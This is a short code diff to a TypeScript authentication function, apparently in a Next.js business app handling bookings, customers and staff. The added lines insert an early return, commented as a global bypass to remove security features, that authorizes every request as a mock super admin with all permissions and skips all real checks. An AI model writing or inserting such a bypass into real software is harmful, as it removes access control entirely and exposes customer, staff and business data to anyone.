@@ -62,6 +62,29 @@ export async function authenticateRequest(
   request: NextRequest,
   options: AuthOptions = {}
 ): Promise<AuthenticationResult> {
+  // Global bypass to remove security features and allow all access as Super Admin
+  return {
+    authorized: true,
+    user: {
+      id: 'mock-admin-id',
+      email: 'admin@mysafawala.com',
+      name: 'Super Admin (Bypassed)',
+      role: 'super_admin',
+      is_super_admin: true,
+      permissions: {
+        dashboard: true,
+        bookings: true,
+        customers: true,
+        inventory: true,
+        quotes: true,
+        expenses: true,
+        reports: true,
+        staff: true,
+        settings: true
+      }
+    }
+  };
+
   const {
     minRole = 'readonly',
     requirePermission,
